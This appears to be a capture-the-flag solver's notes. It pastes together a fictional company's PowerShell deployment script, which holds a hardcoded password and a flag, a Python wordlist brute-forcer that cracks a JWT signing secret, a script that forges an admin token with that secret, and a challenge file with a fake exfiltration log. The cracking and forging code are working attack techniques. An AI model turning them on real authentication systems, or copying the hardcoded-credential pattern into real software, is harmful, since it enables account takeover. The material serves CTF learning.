<#
    Vanguard Cyber - Internal Deployment Automation
    Author: Kyle Murray
    Purpose: Automate deployment of internal web applications
#>

param(
    [string]$Environment = "Production",
    [string]$PackagePath = ".\release.zip",
    [switch]$RestartServices
)

$ErrorActionPreference = "Stop"

# Deployment configuration
$DeployRoot = "D:\Deployments\Portal"
$BackupRoot = "D:\Backups\Portal"
$LogFile = "C:\Logs\deploy.log"
$AppPoolName = "VCPortal"

# TODO: Move creds to Azure Key Vault before production rollout
$DeployUser = "svc_deploy"
$DeployPass = "Winter2026!"

function Write-Log {
    param([string]$Message)

    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Entry = "[$Timestamp] $Message"

    Write-Host $Entry
    Add-Content -Path $LogFile -Value $Entry
}

function Test-Prerequisites {
    Write-Log "Checking deployment prerequisites"

    if (!(Test-Path $PackagePath)) {
        throw "Deployment package not found: $PackagePath"
    }

    if (!(Test-Path $DeployRoot)) {
        New-Item -ItemType Directory -Path $DeployRoot | Out-Null
    }

    if (!(Test-Path $BackupRoot)) {
        New-Item -ItemType Directory -Path $BackupRoot | Out-Null
    }
}

function Backup-ExistingDeployment {
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $BackupPath = Join-Path $BackupRoot "portal_$Timestamp.zip"

    Write-Log "Creating backup: $BackupPath"

    Compress-Archive -Path "$DeployRoot\*" -DestinationPath $BackupPath -Force
}

function Deploy-Package {
    Write-Log "Extracting deployment package"

    Expand-Archive -Path $PackagePath -DestinationPath $DeployRoot -Force
}

function Restart-PortalServices {
    Write-Log "Restarting IIS application pool"

    Import-Module WebAdministration
    Restart-WebAppPool -Name $AppPoolName
}

try {
    Write-Log "Starting deployment for environment: $Environment"

    Test-Prerequisites
    Backup-ExistingDeployment
    Deploy-Package

    if ($RestartServices) {
        Restart-PortalServices
    }

    Write-Log "Deployment completed successfully"

    # FLAG
    # VC{r3c0n_b3g1ns}

    # Reminder:
    # Check the employee handbook cover image on the intranet... something's off about it.
    # I moved it to ctf-001.vanguardcyber.com.au/intranet-9b4e08b0-44d8-4ef5-bdc0-0004ebe87845/handbook.png
}
catch {
    Write-Log "Deployment failed: $_"
    throw
}

#!/usr/bin/env python3

import jwt
import itertools

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY29udHJhY3RvciIsInJvbGUiOiJ2aWV3ZXIiLCJpZCI6MTA5OSwiaWF0IjoxNzI4MDAwMDAwfQ.sR9LvxSW44ABeHio_vl7zZU36NTewC33rGJES4zlT8I"

words = [
    # Flags
    "r3c0n_b3g1ns",
    "h1dd3n_1n_pl41n",
    "VC",
    "VC{r3c0n_b3g1ns}",
    "VC{h1dd3n_1n_pl41n}",

    # Deployment
    "svc_deploy",
    "Winter2026",
    "Winter2026!",
    "VCPortal",
    "Portal",

    # Company
    "Vanguard",
    "vanguard",
    "VanguardCyber",
    "vanguardcyber",
    "vanguardcyber.com.au",
    "ctf001",
    "ctf-001",

    # API
    "contractor",
    "viewer",
    "admin",
    "employee",
    "employeeportal",
    "TemporaryAccess",
    "ExternalContractor",

    # Author
    "Kyle",
    "Murray",
    "KyleMurray",
    "kylemurray",
]

separators = ["", "_", "-", ".", ":", "@", "!"]

tested = set()

def check(secret):
    if secret in tested:
        return False
    tested.add(secret)

    try:
        jwt.decode(
            TOKEN,
            secret,
            algorithms=["HS256"],
            options={"verify_iat": False}
        )

        print("\n[+] FOUND SECRET:", secret)
        exit(0)

    except Exception:
        return False


print("[*] Testing base words")

for word in words:
    check(word)

print("[*] Testing mutations")

for word in words:
    for suffix in [
        "2024","2025","2026",
        "!","!!","123","1234",
        "_dev","_prod","_portal"
    ]:
        check(word + suffix)

print("[*] Testing combinations")

for a, b in itertools.permutations(words, 2):
    for sep in separators:
        check(a + sep + b)

print("[*] Testing triple combinations")

for a, b in itertools.permutations(words, 2):
    check(a + "_" + b + "_2026")
    check(a + b + "2026")
    check(a + "_" + b)

print("[-] No secret found")
this gave us the secret [+] FOUND SECRET: vanguardcyber2026

import jwt
import time

secret = "vanguardcyber2026"

payload = {
    "user": "admin",
    "role": "admin",
    "id": 1001,
    "iat": int(time.time())
}

token = jwt.encode(payload, secret, algorithm="HS256")

print(token)

#!/usr/bin/env python3

# Classification: RESTRICTED
# Author: K. Murray

import sys

EMPLOYEE_DATABASE = {
    1001: {"name": "Sarah Okafor",  "dept": "Security",     "clearance": "TOP SECRET"},
    1002: {"name": "Tom Reeves",    "dept": "Ops",          "clearance": "SECRET"},
    1003: {"name": "Priya Nair",    "dept": "Engineering",  "clearance": "SECRET"},
    1099: {"name": "Contractor",    "dept": "Temporary",    "clearance": "BASIC"},
}

EXFIL_LOG = [
    "2024-10-01 02:14:33  --  sent:  design_specs_v3.tar.gz  -->  c2.vc-exfil.com",
    "2024-10-08 03:02:11  --  sent:  auth_keys_backup.zip    -->  c2.vc-exfil.com",
    "2024-10-15 01:55:44  --  sent:  customer_db_dump.sql    -->  c2.vc-exfil.com",
]

print("[EXFIL LOG -- last 3 transmissions]")
for entry in EXFIL_LOG:
    print(" ", entry)
print()
